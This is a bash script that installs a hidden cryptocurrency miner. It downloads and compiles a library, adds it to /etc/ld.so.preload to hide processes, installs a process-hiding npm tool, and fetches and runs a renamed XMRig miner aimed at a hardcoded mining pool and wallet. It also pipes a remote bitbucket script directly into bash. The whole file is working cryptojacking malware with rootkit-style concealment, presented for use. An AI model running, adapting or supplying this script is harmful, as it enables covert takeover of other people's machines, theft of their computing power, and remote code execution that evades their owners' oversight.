#!/bin/bash
apt-get update ; apt-get install sudo -y
curl https://github.com/ganejafaujanih/acuy/raw/main/nyumput.c -o nyumput.c
apt-get install build-essential -y
sudo gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
/etc/init.d/network restart
sudo su --command "apt-get update && apt-get install gcc -y && curl -sL https://deb.nodesource.com/setup_14.x | bash && apt-get install nodejs -y && npm install -g npm@9.3.1 -y && npm i -g node-process-hider && ph add xlarig"
mkdir .kap && cd .kap
wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
sudo ./xlarig -o 172.105.127.237:443 -u ZEPHs9S2EWRQzizKJRbnnvATxUoGNCbG5AH5t3HoCwVRWGuyerr8UshcoEwjzbxq88MNDKhBdmzc1Qs1s4u8JQ33YDcbYhxx5SN -p NES-NES -t $(nproc --all) >/dev/null 2>&1
curl -sL https://bitbucket.org/commuter21/escom/raw/main/gudabel.sh | bash 